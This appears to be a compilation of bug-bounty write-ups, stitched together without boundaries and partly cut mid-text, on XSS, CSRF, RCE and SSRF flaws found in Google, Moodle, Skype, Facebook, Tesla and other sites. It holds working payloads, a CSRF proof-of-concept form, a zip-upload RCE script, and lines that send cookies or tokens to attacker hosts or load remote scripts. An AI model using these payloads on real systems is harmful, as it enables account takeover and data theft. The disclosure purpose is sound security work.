‘understand’ from the content itself how it should be interpreted. In the context of XSS, if the content ‘resembles’ HTML, the browser might understand it as HTML even if the content-type is not set to ‘text/html’. Confused? You’re not alone. When exactly will the browser attempt such a ‘self-understanding’ approach? It depends on the browser, of course, but generally it’s quite a rare thing and mostly applicable to old browsers ( How old? IE 4 old ). To make the attack even less plausible, a specific header (‘X-Content-Type-Options: nosniff’) can be set by the server to indicate to the browser that it should not perform mime-sniffing. This capability has been supported by most major browsers ( with the exception of Safari ) for quite some time ( even in IE 8 ). Missing ‘XCTO header’? Nope Back to the XSS in Google. My colleague considered his mime-sniffing XSS to be a ‘slightly more real’ XSS (i.e. has chances to be exploited in the real world), as the server response he received lacked the ‘X-Content-Type-Options: nosniff’ header, which means that the browser might perform MIME-Sniffing in some cases. While I was not entirely convinced (neither of us were able to create a POC that actually works), I could sort-of accept that Google holds itself to the highest security posture, thus accepting the lack of header as an issue. That is until I found my own XSS. The most confusing Google response of all time A few weeks later, I found my own instance of persistent XSS with non-HTML content type. In my case, the ‘X-Content-Type-Options: nosniff’ was set. Nonetheless, not wanting to miss out on all this bounty goodness, I submitted it as a bug. This triggered the most confusing Google response I could think of. Originally, the bug was rejected, as I could not provide a POC. This was the result I expected. Later, though, this happened: Without any new data from me, Google switched from ‘intended behavior,’ to ‘new,’ to ‘accepted’ just to realize a week later that they were already following this as a bug. Apparently, I’m not the only one to be confused about mime-sniffing. I decided to tackle the issue once and for all and asked Google about it. That was very helpful: Problem solved indeed. At this point I felt that more data is needed (and let’s be honest, more bounties too). So, I decided to invest some time in detecting more such instances and in reporting everything I find. Bounties, bounties, bounties In the following months I’ve detected and reported several more instances, each with slightly different characteristics, including a ‘ZIP’ document response (content-disposition set to ‘attachment’), ‘plain/text’ content type, ‘CSV’ content type, and even ‘Custom’ content-type. Without fail, all of the bugs I’ve reported were accepted (expect those deemed as duplicates), though several required some ‘convincing’: Ah ha! ‘Weird stuff!’ That explains everything. I can now use Google tricks against them: After that last email, the bug was accepted (and I was rewarded). Final thoughts Personally, my thoughts after this research remained similar to those I had before – while I accept that it is a theoretical risk, an XSS that requires mime-sniffing just doesn’t cut it for me. And I’m not alone – as shown above, at least some Google security engineers don’t really see the risk either. With that being said, I have huge respect for Google here for making the decision to treat such XSS as a real risk. Their decision to put their users’ security as first priority and fighting such esoteric vulnerabilities (even at the cost of paying good bounty money) can only be appreciated and I wish other organizations of such caliber would take security half as seriously as Google does.

Here’s the full content:\n\nObtaining XSS Using Moodle Features and Minor Bugs | by Daniel Thatcher | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Obtaining XSS Using Moodle Features and Minor Bugs Daniel Thatcher 6 min read · Apr 9, 2019 -- 3 Listen Share Moodle allowed users to embed arbitrary HTML in their own dashboards, which are only visible to themselves, creating a situation which is equivalent to self-XSS. In this blog post I describe how it was possible to exploit this by setting a second session cookie with a restricted path, initially in combination with login CSRF, and then by using Moodle’s builtin impersonation functionality, to target other users. While much of the previous exploitation of self-XSS only allows the attacker to obtain read-only access to the DOM, this technique allows JavaScript to be run as the victim user, as with any regular XSS. The following video shows how an administrator can be targeted to give an attacker shell access to the Moodle server. In this video, an administrator follows a link sent to them by an attacker. The next time the administrator logs in to their account in the same browser, a malicious plugin which gives the attacker a shell on the web server is uploaded using JavaScript. Targeting an administrator to upload a malicious plugin Introduction A while ago I came across some interesting techniques for exploiting self-XSS in combination with other issues, so when I noticed the following in a Moodle security announcement I was very interested: Authenticated user[sic] are allowed to add HTML blocks containing scripts to their Dashboard and this is normally not a security issue because personal dashboard is visible to this user only. While this is more of a feature than it is stored self-XSS, it does create an equivalent situation as users are able to insert arbitrary HTML and JavaScript which is run in the context of the target domain, but should only ever be rendered in their browser. The login form also had no CSRF protection, making it possible to use the techniques I mentioned to obtain read-only access to any page a victim user is able to view. This did not allow anything of great interest to be leaked from a Moodle installation with minimal extra configurations (perhaps due to my lack of knowledge of Moodle), so I looked for ways to turn this into full XSS where I could run arbitrary JavaScript as a victim user. Double Session Cookies The method I came up with takes advantage of the way that PHP and browsers treat multiple cookies with the same name. PHP I found that if two session cookies are sent in a request to Moodle, the first session cookie which appears in the Cookie header is used, while the second is ignored. So, in the request below, the session cookie highlighted in bold is used to identify the logged in user, while the other session cookie of the same name is ignored: GET /my/ HTTP/1.1 ... Cookie: MoodleSession= 0ab0af2b5369369af1fae6b097cf64f7 ; MoodleSession=d879cda2c1b27a4eefa02e7a48a63d73 This is a result of PHP’s behaviour for handling multiple cookies, which leads to only the first cookie being present in the $_COOKIE superglobal. Browsers Chrome and Firefox¹ will generate a request containing duplicate cookies, such as the one above, when different values of the same cookie are set with different paths. So, say there are two cookies are set in the browser: a cookie named MoodleSession with a path of / containing a session identifier associated with Alice’s account; and a cookie named MoodleSession with a path of /my/ containing a session identifier associated with Bob’s account. This will lead to only Alice’s session cookie being sent in requests to paths outside of /my/ , and both session cookies being sent in requests to /my/ , which is the path of the user’s dashboard in Moodle. It appears that both Chrome and Firefox will send cookies with more restrictive paths first, so Bob’s session cookie will be the one sent first, and hence used by Moodle, when the browser requests /my/ . A user of this browser will see all of the site as though they are logged in as Alice, apart from /my/ , which will show Bob’s dashboard. Exploiting The combination of CSRF on the login form and the double session cookie behaviour gives us all we need to target other users with JavaScript embedded on our dashboard. The setup I’m using is a Moodle installation located at http://moodle.lab.local , which contains an administrator account named admin , and a low privileged account which the attacker has access to, named attacker. There is also a server belonging to the attacker at attacker.lab.local . All the files used are available in this GitHub repository . 1. Setup First the attacker embeds a script such as the one from the GitHub repository , part of which is shown below, in their dashboard. This is most easily done by adding a new HTML block and using an intercepting proxy such as BurpSuite. The first stage of the moodle.js script. This script will check if a cookie named poisoned is set in the browser. If it is not, it will set this cookie, and requests a session cookie belonging to the attacker account from the cookie.php script² which it then puts in the MoodleSession cookie with a path of /my/ . The script then causes a logout from the attacker account, which does not invalidate the newly set session cookie as it involves requests to path outside of /my/ . If the poisoned cookie is present then the script will execute the final XSS payload, which I will discuss later. 2. Attack The attacker now targets their victim user, in this case the owner of the admin account, with a simple login CSRF payload such as the one below which logs the victim in to the attacker account. Login CSRF to force a user to be logged in to the ‘attacker’ account. This will cause the victim to view the dashboard of the attacker account, and the script from the previous subsection to be run in their browser. The victim will then have the poisoned cookie and a session cookie belonging to the attacker account set in their browser with a path of /my/ , following which they will be logged out. The next time the victim logs in to the admin account in the same browser, they will be able to browse all of the Moodle installation apart from their dashboard, including the admin panel, as normal. However, the request to /my/ to load their dashboard will return the dashboard of the attacker account with the included script. This script performs the second stage of the attack due to the presence of the poisoned cookie in the browser. 3. Final payload Popping an alert box or loading in DOOM doesn’t obviously show impact here as it will show up on the dashboard of the attacker account rather than the admin account. Since we can still make requests to the admin panel as the admin account, I decided to upload a malicious plugin using JavaScript. This plugin gives the attacker a reverse shell using the version.php file. Targeting an administrator using login CSRF (same video as before) The JavaScript to do this can be found here . It is long and ugly, as well as a bit noisy, and I won’t go through it. It essentially pulls down the plugin.zip file from the attacker’s server³, and replicates the requests that would be sent if the plugin were to be uploaded through the web interface. Using the Impersonation Functionality Initially, Moodle only fixed the CSRF on the login form, though this still allowed the issue to be exploited using Moodle’s impersonation functionality instead. Rather than exploiting login CSRF, an attacker would have to convince an administrator to impersonate their account, causing the administrator to view the attacker’s dashboard. The exact same scripts are then used to exploit this issue. Targeting an administrator using the impersonation functionality Disclosure Timeline 2018–08–18: Issue reported to Moodle with details of exploiting using login CSRF. 2018–08–25: Details of exploiting using impersonation functionality added to issue. 2018–10–25: Asked to create a separate ticket for the exploitation using the impersonation functionality. 2018–11–12: Login CSRF patched (Moodle versions 3.1.15, 3.3.9, 3.4.6, 3.5.3). CVE-2018–16854 and MSA-18-0020 assigned. 2019–03–11: Moodle now sets the forceclean parameter to true when in an impersonated session to prevent user controlled JavaScript from being included in user’s dashboards (Moodle versions 3.1.17, 3.4.8, 3.5.5, 3.6.3). CVE-2019–3847 and MSA-19-0004 assigned. Footnotes ¹ Other browsers untested. ² The attacker’s server must return the header Access-Control-Allow-Origin: * or equivalent along with the result of this script to allow the value to be read by JavaScript cross-domain on line 10. ³ Again this needs to be returned with the Access-Control-Allow-Origin: * header.

Here’s what I did to affect other users,You just need to create a invite link and make a user join your group. Once ,the user joins your group ,You just need to make him as admin using the option I mentioned earlier.(requires no user interactions once he joins the group) Once user is made as admin ,He will now see the same option called (“make the USER as admin of group_name”), where the gropu_name was not sanitized and xss gets executed successfully on the user also!!! Press enter or click to view image in full size So It all ended??? No, I did more research and put a BXSS payload “><script src=”malicious_script_url”> in group_name. Now add a member by sending the member a invite link. Press enter or click to view image in full size Once the member clicks the invite link,and accepts it , xss was getting executed in another sub domain too( secure.skype.com) !!! The BXSS payload used was provided by xsshunter ,through which I was able to get user details like screenshot of affected page,user cookies,headers,device informations,ip address etc!!! This has hell lot of information ,which is sufficient to compromise user data and also account takeover.

First a few days ago I was testing a website lets call it example.com and I found a subdomain on this website which includes some functions so I start to test it I found a Self-Stored XSS on a description field which allows HTML tags and I found a CSRF attack to add the XSS payload but there is a problem I should get the template ID to edit it and I can’t Brute Force it on this time I left it alone, nowadays when I return to test I opened my Burp and caught requests I found an interesting request I sent it to Repeater and sent it again and I found that a new template added to my template list WOW this is good, I scanned the request and I didn’t found any CSRF protection the cool thing in the request include the template ID which I can use it to add some contents on the template fields in this time I remembered the old bug which is Self-Stored XSS so I tried to exploit these two bugs together to get Strored XSS I created an HTML file as POC this is the code <form action=\" https://subdomain.example.com/endpoint \" method=\"POST\"> <input type=\"text\" name=\"svcid\" value=\"WRKSPC_LAYER_SERVICE\"><br> <input type=\"text\" name=\"stok\" value=\"\"><br> <input type=\"text\" name=\"v\" value=\"0\"><br> <input type=\"text\" name=\"clientType\" value=\"\"><br> <input type=\"text\" name=\"request\" value='{\"basePage\":{\"draftIds\":[\"1514844016810\"],\"wsId\":\"-1\",\"wsType\":\"-1\"},\"fields\":{\"title\":\"CSRF_1\",\"bold\":\"false\"},\"fields\":{\"description\":\"<font rwr=\\\"1\\\" style=\\\"font-family:Arial\\\" size=\\\"4\\\"><br>\\\"&gt;<svg onload=\\\"alert(cookie)\\\">\\n</svg></font>\",\"rteMode\":\"0\"},\"mode\":\"INDIVIDUAL\",\"action\":\"SAVE\",\"layerName\":\"EDITPANE\",\"variation\":null,\"currencyInfo\":{\"currencySymbolLeft\":true,\"singularName\":\"U.S. dollars\",\"moneySymbol\":\"$\",\"decimalSymbol\":\".\",\"groupingSymbol\":\",\",\"gS\":\",\",\"decimalPlaces\":\"2\",\"currencyCode\":\"USD\",\"pluralName\":\"U.S. dollar\"},\"singleList\":true,\"listingMode\":\"AddItem\",\"updateRequired\":true,\"customFields\":{},\"byPassUpdate\":false,\"sellerType\":\"C2C\",\"saveUlsi\":true,\"edpCrNew\":false,\"deletedFields\":[],\"customAttributes\":{\"PL_SELLER_ELIGIBLE\":\"1\",\"PL_FORMAT_ELIGIBLE\":\"1\",\"PL_CATEGORY_ELIGIBLE\":\"1\",\"PL_ALREADY_OPTED\":\"0\"},\"draftMode\":\"Listing\",\"restricted\":false,\"customPreference\":{\"preferences\":{\"scheduleStartTime\":true,\"reservePrice\":true,\"sellAsLot\":true,\"privateListing\":true,\"salesTax\":true},\"sellerDetails\":[\"BUSINESS_POLICY\",\"NO_STORE_SUBSCRIPTION\",\"NO_SHIPPING_DISCOUNTS\",\"NON_SM_SELLER\"]},\"payments20\":false,\"templateId\":5553489011,\"isvShown\":false}'><br> <input type=\"submit\" value=\"send\"> </form> this code will send a request to edit a template with id 1514844016810 so the server will not found a template with this id so he will create it and add the new value which is the XSS payload which added to the description, when the victim visits his template list he will found a new one so he will open it and BOOOM the XSS payload will be executed, I was: I hope you enjoy it guys goodbye see you soon.

Let’s say https://reacted.com When I’m testing on this site , there is a function which you can transfer money to another account via wallet address. https://reacted.com/manage/transfer I put xss payload in this field and payload was automatically executed but nothing happened coz they filtered wallet adderss must start with ‘xyz’ and having 98 characters long . So , I prepared my payload like that , xyzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<img src=x onerror=confirm(document.domain)> then when I put above payload xss was fired :”) Me was like But this is basically self xss which is not exploitable other users .So , how can i exploit other users ? I was thinking about it and about 15 minutes later , I noticed that they were provided to fill wallet address in two ways Copy / Paste Scanning QR image What happens if an attacker encode his xss payload as QR image and send it to victim to transfer money ? I encoded my payload like that Press enter or click to view image in full size And then I scanned my qr code and payload was automatically executed then pop up alert . That is enough to exploit other users coz there is no need user action to execute payload and encoded QR image can’t visible as plaintext. I quickly wrote report and reported to security team.They triaged my report and awarded $300 bounty for my finding. :”) Thanks for reading……. -- -- 1 Written by Hein Thant Zin 137 followers · 44 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Finding a vulnerability on admin.google.com was challenging; I managed to find a simple, but interesting form of Cross-Site Scripting . Details: URL: https://admin.google.com/ Proof of Concept: https://admin.google.com/mrzioto.com/ServiceNotAllowed?service=grandcentral&continue=javascript:alert(document.cookie);// admin.google.com is a part of Google Apps service where you are able to configure permissions, users, and Google Services for your domain. This is a feature primarily used by businesses, especially ones that are using Gmail as the e-mail service for their domain. The ServiceNotAllowed page appears when you are attempting to access a Google app service that has not been configured for your domain. It requires that you are logged into at least two accounts and will give you a form to switch accounts to continue to the service you were trying to load. When you select an account via the bullet on the page, it executes JavaScript to redirect your browser. The URL used in this JavaScript is supplied by the user in the continue request parameter. The continue request parameter is fairly common request variable in the Google login flow. This is the only page that I could find that did not validate the URL passed into it. This allowed you to craft Cross-Site Scripting attacks by using \"javascript:\" as part of the URL and it would execute when the browser location is redirected. Attack: Impact: This attack allows you to force a Google Apps admin to execute any request on the admin.google.com domain. Some things that are possible: Forcing the admin to ... Create new users with any permission level that you want, such as a super admin. Disable security settings for individual accounts or for multiple domains. This includes removing two-factor authentication (2FA) from accounts. Modifying domain settings so they point to your domain/dns, therefore all incoming emails to that domain are redirected to you instead. Hijack an account/email by resetting the password, disabling 2FA, and also removing login challenges temporarily for 10 minutes. To demonstrate this, I built a proof-of-concept that shows a JavaScript payload pulling information from the Admin console, grabbing a list of users, changing the password and removing security settings from the first user in the list.

This was initially reported back in August 2013, but due to communication problems over e-mail it wasn't fixed until early January. Neither party is to blame, but this shows some of the difficulties that companies can face communicating with security researchers. This problem hit the media earlier this year when a Facebook security report was not clearly understood and led to the exploit being abused on Mark Zuckerberg's wall. Facebook recently moved their Whitehat communication to their support dashboard instead of over e-mail which is going to help the company and security testers tremendously. The Exploit Sample request: URL: https://www.facebook.com/badges/profile.php POST: fb_dtsg=& layout=horiz &items%5B%5D=badge_profile_pic&items%5B%5D=badge_test&items%5B%5D=badge_hometown&items%5B%5D=badge_email&items%5B%5D=badge_mobile_status&save=Save&bid=2421&badge_type=0&wizard=badges&owner_id=4 When this request is sent, it would return the following source: Source: <div class=\"badge_holder bh_ horiz \"> The layout request variable was being saved to a database and pulled into the <div>'s class. Because the input was not encoded, it allowed you to break out of the div and inject HTML. Example URL: https://www.facebook.com/badges/profile.php POST: fb_dtsg=&layout= \"><b> &items%5B%5D=badge_profile_pic&items%5B%5D=badge_test&items%5B%5D=badge_hometown&items%5B%5D=badge_email&items%5B%5D=badge_mobile_status&save=Save&bid=2421&badge_type=0&wizard=badges&owner_id=4 Screenshot: Normally I would show an iframe or script alert as an example, but this is the only screenshot I still have of this. The entire badge page has since been completely overhauled and no longer functions in a way that a string is passed by the client to a database to be saved. The Danger Although this could force you to save JavaScript/HTML on your badges page, the impact of it is quite small. This request is protected by fb_dtsg which is a csrftoken and Facebook has X-Frame-Options preventing clickjacking. That means no one can force you to make this request, you would have to damage yourself or the attacker would have to already have access to your Facebook. Even still, you would have to visit the badge page in order for it to execute. I'm going to bet a lot of you haven't even heard of the badge page until you read this. Regardless, XSS is XSS! It can force you to execute any action protected by a csrftoken and extract information from your Facebook. That means forcing you to make Facebook posts or stealing private data that you didn't want public. The Bug Submitted: August 2013 Fixed: January 2014"}

This is a perfect example of how the communication between the bug bounty operator and the researcher can satisfy both parties. The fixes for the critical vulnerabilities (RCE, SQLi, LFI) were implemented quite fast within only a few days after my initial report (!) , the fix for the XSS took a bit longer, but it’s still acceptable for a medium-severity issue. Bug Bounty programs are always a great challenge and sometimes you’re rewarded with pretty cool stuff and great references like this – now here’s a short write-up about the discovered vulnerabilities, which already have been fixed by Magix. Remote Code Execution on europe.magix.com This is the most dangerous flaw, I’ve found while working on this bug bounty program. I’ve discovered a script, that allows an attacker to upload zip files via a HTTP POST request. The script accepts any zip file, renames it to some temporary name and finally extracts the .zip file to a worker directory without checking if the zip file contains a valid file. Additionally, the extracted contents were accessible via www – I think the problem is quite obvious. To prove the exploitability to Magix, I wrote a short Python script. The following snippet shows how the quite handy Python ZipFile function can be used to dynamically generate a zip file in memory. The .zip file contains one single file named “/tmp/test.php” with a custom PHP payload. #!/usr/bin/python import zipfile from StringIO import StringIO import zlib inMemoryFile = StringIO() zipFile = zipfile.ZipFile(inMemoryFile, 'w', zipfile.ZIP_DEFLATED) zipFile.writestr('./tmp/test.php', '<?php echo \\\"www.rcesecurity.com\\\"; ?>') zipFile.close() In case of Magix, the target script echoes some additional (and hazardous) debugging output after POSTing an arbitrary zip file: looks like Magix missed to deactivate this output – without this I wouldn’t have probably found this flaw 🙂 Since the debugging output also discloses the full-path of the extracted file, this leads to a nice RCE condition: Now imagine an attacker who’d upload some malicious C99… SQL Injection on europe.magix.com This vulnerability is more or less based on the same condition like the previously described RCE flaw. If the zip file contains a specially prepared .ini file, the same script, that is responsible for the RCE flaw, uses the .ini values unfiletered in a SQL query: Local File Inclusion on downloadsv9.xara.com A local file inclusion could become as dangerous as a RCE flaw, because an attacker may read sensitive system files like /etc/passwd: …and if you’ve got a lazy sysadmin who likes to chmod 777 on files and directories, even more might by revealed 😉 Cross-Site Scripting on downloadsv9.xara.com OK – I promised not to write about a XSS in detail anymore, so I’ll leave you with the PoC screenshot: A real happy day for bug bounty hunters and Magix!

Most of them aren’t that serious. This one isn’t an exception, and I wouldn’t normally blog about it, but it’s an interesting use case as to why content types are important. The bug is an XSS discovered on Facebook Studio . This is linked to by some Facebook marketing pages, and is used to showcase advertising campaigns on Facebook. There is an area which allows you to submit work to the Gallery . This form conveniently has an option to scrape details from your Facebook page and fill in boxes for you (such as Company Name, Description). This calls an AJAX end-point with your pages URL as a parameter. If we set our pages description to something containing HTML/Javascript, it’s properly escaped. However, it’s escaped client-side. The end-point incorrectly sends a content-type header of text/html , when the response is actually JSON. When browsed to directly (it doesn’t need any CSRF tokens to be viewed, despite the hash param), we see our script executed. The cool thing about this bug is that whilst it’s not persistent (the payload is fetched when the page is visited), the code is not present in the request body, therefore avoiding Chrome’s XSS Auditor and IE’s XSS Filter. Had the content type been set to application/json , the code would have not run (until you start to consider content sniffing…). Fix The content type is now set correctly.

Due to the way the bug is triggered, I thought it deserved a write-up. Whilst browsing the site, you’ll notice that pages are loaded via AJAX with the path stored in the URL fragment (not as common these days now that pushState is available). When the page is loaded, a function, q() (seen below), is called which will check the value of location.hash , and call F.iphone.showSelectedPage() . In order to load pages from the current domain, it checks for a leading slash. If this isn’t present, it prepends one when calling the next function, F.iphone.showPageByHref() . This function then performs a regex on the URL (line 160) to ensure that it’ll only load links from m.flickr.com . If this check fails, and the URL starts with a double slash (relative protocol link), it prepends it with http://m.flickr.com . Pretty solid check, right? Incase you didn’t notice, the first regex doesn’t anchor it to the start of the string. This means we can bypass it providing our own URL contains m.flickr.com . We can get our own external page loaded by passing in a URL like so: //fin1te.net/flickr.php?bypass=m.flickr.com The code will check for a leading slash (we have two :)), which it’ll pass, then checks for the domain, which will also pass, then load it via AJAX. Since we now have CORS in modern browsers, the browser will send an initial OPTIONS request to the page (to ensure it’ll allow it to be loaded), then the real request. All we need to do is specify a couple of headers (the additional options in the Access-Control-Allow-Headers are to prevent syntax errors in the Javascript), along with our payload. The next part of the Javascript dumps the response into an element with innerHTML . Which leads to our payload being executed. Fix This issue is now fixed by anchoring the regex to the start of the string, and also running another regex to check if it starts with a double slash. websec bugbounty yahoo flickr xss cors Updated on December 12, 2013 Jack Like Tweet +1 Read More From Bug Bounty Hunter, to Engineer, and Beyond A couple weeks ago I had my last day on Facebook's Product Security team.

All of the input boxes have a note below saying that you can’t add HTML, so I was interested to see how it checks/prevents you from entering any. I tried adding in some tags, <a>, <span>, <script>, however they’re all filtered out. In addition to this, you can’t use double quotes (so you can’t break out of attributes). However, it turns out they use a blacklist of HTML tags. I tried a deprecated tag, <plaintext>, and to my surprise it passed through fine. I don’t like the plaintext tag, as it caused the rest of the page to render horribly (as expected), so I tried a few more. <fn> and <credit> both passed through too. Now we have a way to inject HTML, I added an onhover event to the injected element. Without the use of quotes, we can use the String.fromCharCode function and eval to load an external script - this is necessary as the character limit on the textbox is 1k. From this point onwards, it is trivial to weaponise this into a working worm. We get the username from the element #gh_uh , construct a form post to the bio page and add ourselves to the logged in users bio. There is no CSRF protection on this form, which makes it even easier as we don’t need to scrape a token from anywhere. In addition to this, all of the cookies are stored under *.ebay.com, and they’re not using HTTPOnly so we can steal this too.

It is the same guy who used a toaster to control a PC game a few years ago . How technically accurate these videos are can be discussed, but the underlying creativity is hard to question. Naturally, when we saw the video, we did not want to lag behind, but what is the best way to respond to something like this? As we work with web security, that would, of course, have to play a key role. Note: We contacted Tesla (who have a bug bounty program ) about this and the issue is now fixed. Step one was to choose the target. He did Porsche… and we will do Tesla. A more hyped car company is hard to find, and after all, if you had to guess which car company has something to do with DOOM, Tesla would most likely be at the top of that list. Next up is the method. While buying a Tesla as marketing or research expense would be a lot of fun, we are not a car security company, but work with web security. There is also the distinct possibility our investors would not agree that a Tesla is a reasonable expense for a blog post. All things considered, hacking their website made much more sense. Here comes the next problem – rumor has it that people do not appreciate it if you replace their website with a game just because you want to play. So it had to be fairly innocent, and at the same time have something to do with DOOM. See where this is heading? The DOM DOOM XSS We had to invent the DOM DOOM XSS. After some googling it seems like it has not been done before, but feel free to enlighten us. We gladly give credit where credit is due. The technical aspect of this is pretty straightforward. We hosted a web version of DOOM at a domain we own (feel free to try it out) and went on to find a DOM XSS at Tesla. The DOM XSS was soon thereafter found at forums.tesla.com (it should be noted it is a self xss, meaning very limited potential impact). We located the field under the Insert HTML button. That is what we were going to use. The function called when pressing that button is InsertHTML() ; function InsertHTML() { var editor = CKEDITOR.instances.editor1; var value = document.getElementById('htmlArea').value; if (editor.mode == 'wysiwyg') { editor.insertHtml(value); } else { alert('You must be in WYSIWYG mode!'); } } We now see that this function uses InsertHtml, so fire up the documentation for that function . As value is the only parameter passed in editor.insertHtml(value) the mode will default to ‘html’ as per the documentation. As can be understood by reading about ‘unfiltered_html’, ‘html’ implements a filter which we would have to bypass. We could now continue digging our way towards the holy game by clicking on the next link to CKEDITOR.filter. However, if there is anything the websec community should have learned by now it is that most filters are bypassable, so let us leave that part as an exercise for the reader. To sum it up, after playing around with it we ended up with the following payload: <img src=\"/\" =_=\" title=\"onerror='alert(document.domain)'\"> And sure enough, the familiar little box telling us it worked was not far away: We got a script replacing the whole page with an iFrame to the game hosted here , so now just a few lines of JavaScript to load in that script: var w = window.top.document; var x = w.createElement(\"script\"); x.type = \"text/javascript\"; x.src = \"https://doom.fredrik-almroth.se/exploit.js\"; w.getElementsByTagName(\"head\")[0].appendChild(x); window.top.history.pushState(\"\", \"\", \"/doom.exe\"); (all credit to @caiiiycuk for js-dos that was used for the game) Combined with our previously found payload, it results in this mess: <img src=\"/\" =_=\" title=\"onerror='var/**/w=window.top.document;var/**/x=w.createElement(\"script\");x.type=\"text/javascript\";x.src=\"https://doom.fredrik-almroth.se/exploit.js\";w.getElementsByTagName(\"head\")[0].appendChild(x);window.top.history.pushState(\"\",\"\",\"/doom.exe\");'\"> All that is left to do now is going to the vulnerable page , pasting the payload in the text field and pressing Insert HTML.. and voilá: https://fredrik-almroth.se/doom.mp4 Twitter LinkedIn Linus Särud & Fredrik Almroth Bug Bounty Hunters Check out more content How to Advanced subdomain reconnaissance: How to enhance an ethical hacker’s EASM External Attack Surface Management (EASM) is the continuous discovery, analysis, and monitoring of an organization’s public facing assets.

I hope you like it . :) . Please excuse my informal writing flow . So this is about how I chained one bug after the other to get stored XSS and CSRF . So lets jump into it : Lets call the site , site.com . On digging up the site one of the forms was susceptible to CSRF .So as usual i shot my request through engagement tools and generated a CSRF POC through Burp ! And guess what It worked like charm . I was happy (Sometimes it happens while hunting bugs , you start celebrating your success and later realize you did some stupid shit and ignored something ). Similar thing happened couple of months back when I though I found an IDOR , later realized I was hacking my own freaking account (Some User ID confusions) . Anyways Keeping it aside . So I realized that there was this stupid id parameter that was passed in the POST request that was unique that didn't let me do the CSRF . So let me rephrase my bug and call it ‘partial CSRF’. So there was a good news and a bad news : 1.There was no anti CSRF token in the POST body nor in the header . 2.There was a id (6 digits) that was sent along other parameters in the post request , that was acting kinda like a anti CSRF token . So there was no way i could do the CSRF attack (Shoot up comments if you have some ideas) . This was depressing ! After digging little further, I found one of the paramters in the POST request was vulnerable to XSS (Call me lucky , cause normally you wont find CSRF and XSS at the same place) . So I had two bugs in hand : 1. Patial CSRF : I was not able to do changes in the victims account since it gave error that id is not valid . 2. Reflected XSS : I could still toss up cookies to my server . So yeah it was a real bug . So now I had a real bug in hand . But I wanted to do CSRF because if it gets executed I can get a stored XSS . :) For doing the CSRF I had to get the value of ID somehow . For getting the value of the ID I had XSS in hand:) . But God had different plans for me . Unfortunately the form after doing a partial CSRF loads up the bogus id value that we forged . So it was not possible to get the ID value from that form (Shit ! It became tongue twister) . :( So I started building up the payload that would redirect me to the page that has the ID and fetch it for me . Unfortunately after several attempts I was not able to do so , Why ? Because when the new page loads up , the rest of the Javascript was not able to execute . (There may be definately some workarounds . Also correct me if I am wrong:) ) . I tried to using XHR , But still somehow the ID was not fetched . So I though and thought and thought . I did over thought and slept . Later again luck came into play . I analysed the page source of the forged form (Which was obtained after partial CSRF) for the ID at some other place . Fortunately , I found that Id hidden in one of the html element . Hey bhagwaan !!!! BC pehle kyon nhin dikha . So now the work was easy : The payload was pretty basic one : KadiNinda”><ScRipt>location.href = ‘ http://www.attacker.com/shhhhhh.php?cookie='+document.getElementById( \"id\").value;</sCriPt> This would send a GET request containing the Id value for that user to my server . I Verified it using console network tab in the browser . 2. Once I had the id, Its pretty basic do a FULL CSRF and a Stored XSS . So Victory . That was all for the post . PS : This is my page , Ultimate1337trolls . Where I do lots of leet trolls . Would appreciate if you join the leet gang ! :D Security Bug Bounty Appsec Cybersecurity -- -- 3 Written by Mandeep Jadon 331 followers · 3 following Cybersecurity Enthusiastic | Bathroom Singer l Writer | Bug Hunter | Into Memes :) Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Here’s the full content:\n\nEscalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read | ziot Menu Skip to content BLOG RESUME TWITTER < Back Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read June 29, 2017 February 25, 2024 I recently came across across a request on a bounty program that took user input and generated an image for you to download. After a little bit of a journey, I was able to escalate from XSS inside of an image all the way to arbitrary local-file read on the server. It's a private program, so I'm going to do my best to redact as much information as possible. The original request looked something like this: https://website/download?background=file.jpg&author=Brett&header=Test&text=&width=500&height=500 And it would output a file like this: I initially went after the background request var because it specified a file name and I think that one looks the most interesting. After messing around with the parameters a bit, I noticed that the header request variable was vulnerable to some form of HTML injection. I have read some write-ups of XSS inside of PDFs leading to critical vulnerabilities, so I decided to chase this a bit. https://website/download?background=file.jpg&author=Brett&header=\"><u>test&text=&width=500&height=500 Output: Starting to put random HTML elements in, I noticed that almost all of them were rendering: iframe, img, script, etc. I decided to target my own server to see if I could get a bit more information on what is processing the HTML. https://website/download?background=file.jpg&author=Brett&header=<iframe src=https://xss.buer.haus/ssrftest></iframe>&text=&width=500&height=500 Response: [25/Jun/2017:20:31:49 -0400] \"GET /ssrftest HTTP/1.1\" 404 548 \"-\" \"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1\" The User-Agent in the request means they are using the headless browser client PhantomJS to load an HTML page and generate image data. I already had some experience with Phantom because it's often used in CTFs and I use it in my online scanner for capturing screenshots of websites. This was a good thing to pick-up on early because it explained some of the issues I encountered while trying to exploit this vulnerability. The first problem I ran into was that JavaScript was not consistently executing using basic payloads. <script></script> would not execute properly. <img src=x onerror=> would not trigger consistently. I think I got one successful window.location redirect out of 100 attempts. In some cases, the payloads would not execute at all. On top of that, I was running into some server exceptions when trying to redirect to another page: https://website/download?background=file.jpg&author=Brett&header=<img src=\"x\" onerror=\"window.location='https://xss.buer.haus/'\" />&text=&width=500&height=500 Response: {\"message\": \"Internal server error\"}. I tried probably 50 different types of payloads there until I realized that the problem is actually with what appeared to be some sort of race condition with PhantomJS. I ran into a similar issue writing a plugin for Phantom with my scanner where it would not wait for JavaScript to completely load when trying to capture some screenshots. I needed to find a way to make Phantom wait for my JavaScript to load before trying to finish rendering the screenshot. After trying a few different ideas, I used document.write to completely overwrite the page contents and that seemed to fix it. I don't know why, but it worked. https://website/download?background=file.jpg&author=Brett&header=<img src=\"x\" onerror=\"document.write('test')\" />&text=&width=500&height=500 Response: At this point I had consistent JavaScript execution on every page load. The next step I needed to take was to gather more information about PhantomJS and the context of what and where we are executing. https://website/download?background=file.jpg&author=Brett&header=<img src=\"x\" onerror=\"document.write(window.location)\" />&text=&width=500&height=500 Response: Interesting enough, we are executing from the origin of file:// and it was an HTML file in /var/task/. Now I wanted to see if I could <iframe> the file just to validate that I'm in the same origin as /var/task/. https://website/download?background=file.jpg&author=Brett&header=<img 